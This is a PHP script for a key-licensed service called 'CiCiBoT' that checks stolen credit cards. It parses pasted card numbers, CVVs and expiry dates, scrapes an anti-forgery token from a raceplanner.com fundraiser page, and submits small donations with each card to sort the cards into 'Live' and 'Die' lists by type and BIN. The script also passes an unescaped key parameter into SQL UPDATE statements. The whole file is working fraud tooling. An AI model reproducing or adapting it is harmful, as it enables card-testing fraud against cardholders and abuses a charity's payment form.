<?php
session_start();
require('DB.php');
if(!isset($_GET['key'])){
    header("Location: key");
    return;
}
else{
    $db = connect();
    $sql = "SELECT * FROM `mykeys` WHERE keys='" . mysql_escape_string($_GET['key']) . "' ";
    $key = null;
    foreach ($db->query($sql) as $row) {
        $key = $row;
    }
    if($key==null){
        header("Location: key?error=1");
        return;
    }
    if($key['leftamount']<=0){
        header("Location: key?error=2");
        return;
    }
}
?>
<html>
<head>
    <title>Check CC from campaigncontribution.com</title>
    <link rel="stylesheet" type="text/css" href="default1.css">
</head>
<body>
<center>
<?

set_time_limit(0);

function check($ccnum, $ccv2, $moth, $year,$zip=12345,$balance=1)
{

    define('RACE','Team_MFM5K_Red');
    define("URL", "https://www.raceplanner.com/fundraisers/donate?ID=".RACE."&donationamount=".$balance);
    define('URLSTEP2','https://www.raceplanner.com/fundraisers/processwizarddonation');

    $header_array[0] = "Host:www.campaigncontribution.com";
    $header_array[1] = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36";
    $header_array[2] = "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
    $header_array[3] = "Accept-Language:en-us,en;q=0.5";
    $header_array[5] = "Accept-Charset:ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $header_array[6] = "Keep-Alive:300";
    $header_array[7] = "Content-Type:application/x-www-form-urlencoded";
//$header_array[9]= "Content-Length:1810";

//$cookie_file_path = dirname(__FILE__).'/daicomvll.txt';
//				$fp = fopen($cookie_file_path,'wb');
//				fclose($fp);
    $url = URL;
    $agent = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, $agent);
    //curl_setopt($ch, CURLOPT_HTTPHEADER, $header_array);
    curl_setopt($ch, CURLOPT_POST, 0);
    curl_setopt($ch, CURLOPT_HEADER, 1);
//	curl_setopt($ch,CURLOPT_POSTFIELDS,$POSTFIELDS);
//	curl_setopt($ch, CURLOPT_REFERER, $reffer);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file_path);
//	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file_path);
    $result = curl_exec($ch); // grab URL and pass it to the variable.

    preg_match('/^Set-Cookie:\s*([^;]*)/mi', $result, $m);

    parse_str($m[1], $cookies);
    $mycookies = '';
    foreach ($cookies as $k => $v) {
        $mycookies .= $k . '=' . $v . ';';
    }
    //var_dump($mycookies);

    curl_close($ch); // close curl resource, and free up system resources.
    $textbegin = "AntiForgeryToken\":\"";
    $textend = "\",";
    $begin = strpos($result,$textbegin);
    $end = strpos($result,$textend, $begin);
    $token = substr($result, $begin+strlen($textbegin),$end- ($begin+strlen($textbegin)));
    $textbegin = "CampaignID\":\"";
    $textend = "\",";
    $begin = strpos($result,$textbegin);
    $end = strpos($result,$textend, $begin);
    $camid = substr($result, $begin+strlen($textbegin),$end- ($begin+strlen($textbegin)));
   // echo $token;
    define('CAMPID',$camid);
   // echo CAMPID;
    /*
       $url = 'https://www.campaigncontribution.com/v5/process/info.asp';
       $reffer = URL;
       $POSTFIELDS = 'id=' . ID . '&tid=&mid=2&jid=&layout=1&language=EN&title=MISS&firstname=weqw&middlename=weqw&lastname=qweqwe&suffix=&address1=23213+qwewqeqweqw&address2=&city=sdadad&state=AL&zip=21212&email=sadasd%40gmail.com&homephone=5431236541&HomePhoneExt=&employer=asdads&occupation=asdads&workphone=&WorkPhoneExt=&amount='.$balance.'&monthly=O&monthlymonth=&monthlyyear=&comment=';
       $ch = curl_init();
       curl_setopt($ch, CURLOPT_URL, $url);
       curl_setopt($ch, CURLOPT_USERAGENT, $agent);
       //curl_setopt($ch, CURLOPT_HTTPHEADER, $header_array);
       curl_setopt($ch, CURLOPT_POST, 1);
       curl_setopt($ch, CURLOPT_POSTFIELDS, $POSTFIELDS);
       curl_setopt($ch, CURLOPT_REFERER, $reffer);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
       curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
       curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
       curl_setopt($ch, CURLOPT_COOKIE, $mycookies);
   //	curl_setopt($ch, CURLOPT_COOKIEJAR, $mycookies);
       $result = curl_exec($ch); // grab URL and pass it to the variable.
       curl_close($ch); // close curl resource, and free up system resources.
       //echo $result;
    */
    $header[0] = 'RequestVerificationToken:'.$token;
    $header[1] = 'Accept:application/json, text/javascript, */*; q=0.01';
    $url = URLSTEP2;
    $reffer = URL;
//      $POSTFIELDS = "CampaignID=".CAMPID."&DonorID=00000000-0000-0000-0000-000000000000&PageUrl=".RACE."&AntiForgeryToken=".$token."&DonationAmount=".$balance."&ProcessingFee=0&AccountType=3&DonorType=0&MatchingSponsorType=1&EmailAddress=my%40gmail.com&Password=&NewUserName=&NewPassword=&ConfirmEmailAddress=my%40gmail.com&ConfirmPassword=&FirstName=mr&LastName=a&PhoneNumber=&Street1=&Street2=&City=&State=&PostalCode=&Country=US&DisplayName=nguyen++a&HideDonation=true&HideDonationAmount=false&AnonymousDonation=true&HeardAboutMethod=&OrganizationName=&MatchingGiftSponsor=&MessageToOrganizer=&InHonorOf=&InMemoryOf=&NotificationDetails=&NameOnCard=nguyen+a&CardNumber=".$ccnum."&CVC=".$ccv2."&CardExpiration=&ExpireMonth=" .(int)$moth. "&ExpireYear=" .$year. "&BillingSameAsPrimary=false&BillStreet1=abc&BillStreet2=&BillCity=xyz&BillState=AL&BillPostalCode=" .$zip. "&BillCountry=US";;
      $POSTFIELDS = "CampaignID=".CAMPID."&DonorID=00000000-0000-0000-0000-000000000000&PageUrl=".RACE."&AntiForgeryToken=".$token."&DonationAmount=".$balance."&ProcessingFee=0&AccountType=3&DonorType=0&MatchingSponsorType=1&EmailAddress=a%40gmail.com&Password=&NewUserName=&NewPassword=&ConfirmEmailAddress=a%40gmail.com&ConfirmPassword=&FirstName=mr&LastName=a&PhoneNumber=&Street1=&Street2=&City=&State=&PostalCode=&Country=US&DisplayName=mr+a&HideDonation=true&HideDonationAmount=false&AnonymousDonation=true&HeardAboutMethod=&OrganizationName=&MatchingGiftSponsor=&MessageToOrganizer=&InHonorOf=&InMemoryOf=&NotificationDetails=&NameOnCard=mr+a&CardNumber=".$ccnum."&CVC=".$ccv2."&CardExpiration=&ExpireMonth=" .(int)$moth. "&ExpireYear=" .$year. "&BillingSameAsPrimary=false&BillStreet1=12345&BillStreet2=&BillCity=LA&BillState=AL&BillPostalCode=21212&BillCountry=US";
//    echo $POSTFIELDS;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, $agent);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $POSTFIELDS);
    curl_setopt($ch, CURLOPT_REFERER, $reffer);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_COOKIE, $mycookies);

//	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file_path);
//	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file_path);
    $result = curl_exec($ch); // grab URL and pass it to the variable.
    curl_close($ch); // close curl resource, and free up system resources.
//echo $result.PHP_EOL;

    $code_ok = 3;
    if (strpos($result, "\"Result\":true")) {
        $code_ok = 1;
    }
    if (strpos($result, "\"Result\":false")) {
        $code_ok = 2;
    }
//  echo $code_ok;
    return $code_ok;

}


function _date($cclist)
{
    if (!is_null($cclist)) {
        foreach ($cclist as $cc) {
            $ccnum = info($cc);
            if ($ccnum) {
                $_d = $ccnum['year'] . $ccnum['mon'];
                $order[$_d][] = $cc;
            }
            else $order['e'][] = $cc;
        }
        ksort($order);
        if (!is_null($order)) foreach ($order as $_d) foreach ($_d as $cc) $ok[] = $cc;
        if (!is_null($order['e'])) foreach ($order['e'] as $cc) $ok[] = $cc;
        return $ok;
    }
}

function _bin($ccnum)
{
    if (isset($_POST['bin'])) {
        $blen = strlen($_POST['bin']);
        $bin = substr($ccnum['num'], 0, $blen);
        if ($bin == $_POST['bin']) return true;
        else return false;
    }
    else return true;
}

function _dup($cclist)
{
    for ($i = 0; $i < count($cclist); $i++) {
        $ccnum = info($cclist[$i]);
        if ($ccnum) {
            $cc = $ccnum['num'];
            for ($j = $i + 1; $j < count($cclist); $j++) {
                if (inStr(str_replace("-", "", str_replace(" ", "", $cclist[$j])), $cc)) $cclist[$j] = "";
            }
        }
    }
    foreach ($cclist as $i => $cc) if ($cc == "") unset($cclist[$i]);
    $ok = array_values($cclist);
    return $ok;
}

function _type($cclist)
{
    foreach ($cclist as $cc) {
        $ccnum = info($cc);
        $_d = $ccnum['type'];
        switch ($_d) {
            case "VISA":
                $order['v'][] = $cc;
                break;
            case "Mastercard":
                $order['m'][] = $cc;
                break;
            case "American+Express":
                $order['a'][] = $cc;
                break;
            case "Discover":
                $order['d'][] = $cc;
                break;
        }
    }
    return $order;
}

function info($ccline)
{
    $xy = array("|", "\\", "/", "-", ";");
    $sepe = $xy[0];
    foreach ($xy as $v) {
        if (substr_count($ccline, $sepe) < substr_count($ccline, $v)) $sepe = $v;
    }
    $x = explode($sepe, $ccline);
    foreach ($xy as $y) $x = str_replace($y, "", str_replace(" ", "", $x));
    foreach ($x as $xx) {
        $xx = trim($xx);
        if (is_numeric($xx)) {
            $yy = strlen($xx);
            switch ($yy) {
                case 15:
                    if (substr($xx, 0, 1) == 3) {
                        $ccnum['num'] = $xx;
                        $ccnum['type'] = "American+Express";
                    }
                    break;
                case 16:
                    switch (substr($xx, 0, 1)) {
                        case '4':
                            $ccnum['num'] = $xx;
                            $ccnum['type'] = "Visa";
                            break;
                        case '5':
                            $ccnum['num'] = $xx;
                            $ccnum['type'] = "Mastercard";
                            break;
                        case '6':
                            $ccnum['num'] = $xx;
                            $ccnum['type'] = "Discover";
                            break;
                    }
                    break;
                case 1:
                    if (($xx >= 1) and ($xx <= 12) and (!isset($ccnum['mon']))) $ccnum['mon'] = "0" . $xx;
                case 2:
                    if (($xx >= 1) and ($xx <= 12) and (!isset($ccnum['mon']))) $ccnum['mon'] = $xx;
                    elseif (($xx >= 9) and ($xx <= 19) and (isset($ccnum['mon'])) and (!isset($ccnum['year']))) $ccnum['year'] = "20" . $xx;
                    break;
                case 4:
                    if (($xx >= 2009) and ($xx <= 2019) and (isset($ccnum['mon']))) $ccnum['year'] = $xx;
                    elseif ((substr($xx, 0, 2) >= 1) and (substr($xx, 0, 2) <= 12) and (substr($xx, 2, 2) >= 9) and (substr($xx, 2, 2) <= 19) and (!isset($ccnum['mon'])) and (!isset($ccnum['year']))) {
                        $ccnum['mon'] = substr($xx, 0, 2);
                        $ccnum['year'] = "20" . substr($xx, 2, 2);
                    }
                    else $ccv['cv4'] = $xx;
                    break;
                case 6:
                    if ((substr($xx, 0, 2) >= 1) and (substr($xx, 0, 2) <= 12) and (substr($xx, 2, 4) >= 2009) and (substr($xx, 2, 4) <= 2019)) {
                        $ccnum['mon'] = substr($xx, 0, 2);
                        $ccnum['year'] = substr($xx, 2, 4);
                    }
                    break;
                case 3:
                    $ccv['cv3'] = $xx;
                    break;
                case 5: $ccnum['zip'] = $xx; break;
            }
        }
    }
    if (isset($ccnum['num']) and isset($ccnum['mon']) and isset($ccnum['year'])) {
        if ($ccnum['type'] == "American+Express") $ccnum['cvv'] = $ccv['cv4'];
        else $ccnum['cvv'] = $ccv['cv3'];
        return $ccnum;
    }
    else return false;
}

function inStr($s, $as)
{
    $s = strtoupper($s);
    if (!is_array($as)) $as = array($as);

    for ($i = 0; $i < count($as); $i++) if (strpos(($s), strtoupper($as[$i])) !== false) return true;
    return false;
}

function percent($num_amount, $num_total)
{
    $count1 = $num_amount / $num_total;
    $count2 = $count1 * 100;
    $count = number_format($count2, 0);
    return $count;
}

if (isset($_POST['cclist'])){

$cclist = trim($_POST['cclist']);
$cclist = str_replace(array("\\\"", "\\'"), array("\"", "'"), $cclist);
$cclist = str_replace("\n\n", "\n", $cclist);
$cclist = explode("\n", $cclist);
if (isset($_POST['dup'])) $cclist = _dup($cclist);
$relog = 0;
$tongso = count($cclist);
echo  $key['leftamount'];
if($tongso > $key['leftamount']){
    header("Location: key.php?error=3");
    return;
}
foreach ($cclist as $ccline) {
    $relog++;
    $ccnum = info($ccline);
    if ($ccnum) {
        if (_bin($ccnum)) {
            $post = "ACTION=&credit_card=" . $ccnum['type'] . "&card_number=" . $ccnum['num'] . "&card_cvv_number=" . $ccnum['cvv'] . "&MONTH=" . ($ccnum['mon']) . "&YEAR=" . ($ccnum['year']);
            $balance = $_POST['balance'];

            $okokok = check($ccnum['num'], $ccnum['cvv'], $ccnum['mon'], $ccnum['year'],21212,$balance);
            //echo $post.'<br>';

            $keytype = $key['keytype'];
            if($keytype==1){
                    $sql = "UPDATE  `mykeys` SET leftamount=leftamount-1 WHERE keys='".$_GET['key']."' ";
                    $count = $db->exec($sql);
            }

            if ($okokok == 1) {
                echo $relog . "/" . $tongso . ".<font color=green>Live | " . $ccline . "</font><br>";
                $cc['l'][] = $ccline;
                if($keytype==0){
                    $sql = "UPDATE  `mykeys` SET leftamount=leftamount-1 WHERE keys='".$_GET['key']."' ";
                    $count = $db->exec($sql);
                }
            }
            if ($okokok == 2) {
                echo $relog . "/" . $tongso . ".<font color=red>Die | " . $ccline . "</font><br>";
                $cc['d'][] = $ccline;
            }
            if ($okokok == 4) {
                echo $relog . "/" . $tongso . ".<font color=black>CantCheck | " . $ccline . "</font><br>";
                $cc['c'][] = $ccline;
            }
            if ($okokok == 3) {
                echo $relog . "/" . $tongso . ".<font color=black>Unknow | " . $ccline . "</font><br>";
                $cc['u'][] = $ccline;
            }

        }
    }
    else {
        echo $relog . "/" . $tongso . ".<font color=black>Line_Error | " . $ccline . "</font><br>";
        $cc['e'][] = $ccline;
    }
    flush();
}
?>
<? if (!is_null($cc['l'])){ ?>
<? if (isset($_POST['date'])) $cc['l'] = _date($cc['l']); ?>
<?     $xx = percent(count($cc['l']), count($cclist));
echo "<center><font color=green><strong>LIVE: " . count($cc['l']) . " ~ $xx %</strong></center><br>"; ?>
<body text="#FFFFFF" bgcolor="#000000">

<center><textarea wrap="off" rows=10
                  style="width:90%"><? foreach ($cc['l'] as $ss) echo $ss . "\n"; ?></textarea>
</center>
<br>
<? if ($_POST['type']) {
    $count = count($cc['l']);
    $cc['l'] = _type($cc['l']);?>
    <? if (!is_null($cc['l']['v'])) { ?>
        <?     $xx = percent(count($cc['l']['v']), $count);
        echo "<center><font color=red><strong>VISA: " . count($cc['l']['v']) . " ~ $xx %</strong></center><br>"; ?>
        <center><textarea wrap="off" rows=10
                          style="width:90%;"><? foreach ($cc['l']['v'] as $ss) echo $ss . "\n"; ?></textarea>
        </center><br>
    <? } ?>
    <? if (!is_null($cc['l']['m'])) { ?>
        <?     $xx = percent(count($cc['l']['m']), $count);
        echo "<center><font color=red><strong>MASTER: " . count($cc['l']['m']) . " ~ $xx %</strong></center><br>"; ?>
        <center><textarea wrap="off" rows=10
                          style="width:90%"><? foreach ($cc['l']['m'] as $ss) echo $ss . "\n"; ?></textarea>
        </center><br>
    <? } ?>
    <? if (!is_null($cc['l']['a'])) { ?>
        <?     $xx = percent(count($cc['l']['a']), $count);
        echo "<center><font color=red><strong>AMEX: " . count($cc['l']['a']) . " ~ $xx %</strong></center><br>"; ?>
        <center><textarea wrap="off" rows=10
                          style="width:90%"><? foreach ($cc['l']['a'] as $ss) echo $ss . "\n"; ?></textarea>
        </center><br>
    <? } ?>
    <? if (!is_null($cc['l']['d'])) { ?>
        <?     $xx = percent(count($cc['l']['d']), $count);
        echo "<center><font color=red><strong>DISC: " . count($cc['l']['d']) . " ~ $xx %</strong></center><br>"; ?>
        <center><textarea wrap="off" rows=10
                          style="width:90%"><? foreach ($cc['l']['d'] as $ss) echo $ss . "\n"; ?></textarea>
        </center><br>
    <? } ?>
<? } ?>
<? } ?>
<? if (!is_null($cc['d'])) { ?>
    <?     $xx = percent(count($cc['d']), count($cclist));
    echo "<center><font color=green><strong>DIE: " . count($cc['d']) . " ~ $xx %</strong></center><br>"; ?>
    <center><textarea wrap="off" rows=10
                      style="width:90%"><? foreach ($cc['d'] as $ss) echo $ss . "\n"; ?></textarea>
    </center><br>
<? } ?>
<? if (!is_null($cc['i'])) { ?>
    <?     $xx = percent(count($cc['i']), count($cclist));
    echo "<center><font color=green><strong>CCInvaid: " . count($cc['i']) . " ~ $xx %</strong></center><br>"; ?>
    <center><textarea wrap="off" rows=10
                      style="width:90%"><? foreach ($cc['i'] as $ss) echo $ss . "\n"; ?></textarea>
    </center><br>
<? } ?>
<? if (!is_null($cc['c'])) { ?>
    <?     $xx = percent(count($cc['c']), count($cclist));
    echo "<center><font color=green><strong>Can't Check: " . count($cc['c']) . " ~ $xx %</strong></center><br>"; ?>
    <center><textarea wrap="off" rows=10
                      style="width:90%"><? foreach ($cc['c'] as $ss) echo $ss . "\n"; ?></textarea>
    </center><br>
<? } ?>

<? if (!is_null($cc['u'])) { ?>
    <?     $xx = percent(count($cc['u']), count($cclist));
    echo "<center><font color=green><strong>Un known: " . count($cc['u']) . " ~ $xx %</strong></center><br>"; ?>
    <center><textarea wrap="off" rows=10
                      style="width:90%"><? foreach ($cc['u'] as $ss) echo $ss . "\n"; ?></textarea>
    </center><br>
<? } ?>


<? if (!is_null($cc['e'])) { ?>
    <?     $xx = percent(count($cc['e']), count($cclist));
    echo "<center><font color=green><strong>LINE ERROR: " . count($cc['e']) . " ~ $xx %</strong></center><br>"; ?>
    <center><textarea wrap="off" rows=10
                      style="width:90%"><? foreach ($cc['e'] as $ss) echo $ss . "\n"; ?></textarea>
    </center><br>
<? } ?>

<?
}else {
?>
<html>
<head>
    <meta charset="utf-8">
</head>
<body>
<center><h1>CiCiBoT</h1>
    <p>
        <?php
         if(isset($key) && $key !=null){
             echo 'Using KEY: <b>'.$key['keys'].'</b>, còn '.$key['leftamount'].' lần check';
         }
        ?>
    </p>
    <form action="" method=post>
        <textarea wrap="off" name=cclist style="width:90%;height:50%"></textarea><br>
        Duplicate Remove: <input name=dup type=checkbox value=1 checked> Sort by type: <input
            name=type type=checkbox value=1 checked><br>
        Xep theo Date: <input name=date type=checkbox value=1 checked> Chi check BIN: <input
            type=text name=bin MAXLENGTH=6 size=8 style="text-align:center">
        Balance: <input name="balance" value="1">
        <br>
        <input type=submit name=submit value="Check Now!"></form>
    <br>
    <? } ?>
</center>
</body>
</html>
